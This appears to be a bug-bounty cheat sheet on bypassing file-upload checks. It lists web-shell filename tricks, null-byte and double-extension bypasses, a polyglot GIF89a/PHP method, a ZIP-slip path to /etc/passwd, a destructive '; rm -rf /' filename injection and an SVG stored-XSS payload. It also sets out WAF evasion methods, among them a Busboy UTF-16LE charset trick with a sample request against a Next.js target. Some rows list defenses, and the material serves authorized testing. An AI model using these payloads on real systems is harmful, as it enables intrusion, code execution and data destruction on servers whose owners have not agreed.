# File Upload

## Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

## File Upload Bypass Techniques (10 Techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

## Magic Bytes Reference
| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

## Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

## WAF Bypass for File Upload
Run: `bughunter/tools/multipart_mutator.py --file shell.aspx --field file` for 10 parser-confusion variants.
Combine with polyglot (GIF89a magic bytes + PHP payload).
RFC 2231 filename: `filename*=utf-8''shell.php`.
MIME Base64: `filename="=?utf-8?b?c2hlbGwucGhw?="`.

## Busboy / Undici Multipart Parser Internals (Node.js / Next.js)

### Busboy charset decoder quirk
Busboy's `getDecoder(charset)` falls through for UTF-16 aliases:
```
case 'utf16le': case 'utf-16le': case 'ucs2': case 'ucs-2':
  return decoders.utf16le;
```
`Content-Type: text/plain; charset=utf16le` on a multipart part causes Busboy to decode as UTF-16LE. WAF sees null-byte-padded garbage; Busboy reads valid ASCII/payload.

### Bypass Technique
```http
POST / HTTP/2
Host: nextjs-target.vercel.app
Next-Action: x
Content-Type: multipart/form-data; boundary=y

--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

<UTF-16LE encoded __proto__ payload>
--y
Content-Disposition: form-data; name="1"
"$0"
--y--
```

### Key Takeaway
When a Node.js/Next.js target uses `multipart/form-data` for API actions, test per-part `Content-Type: text/plain; charset=utf16le` on each field. WAFs inspecting raw bytes will miss UTF-16LE payloads that Busboy decodes correctly.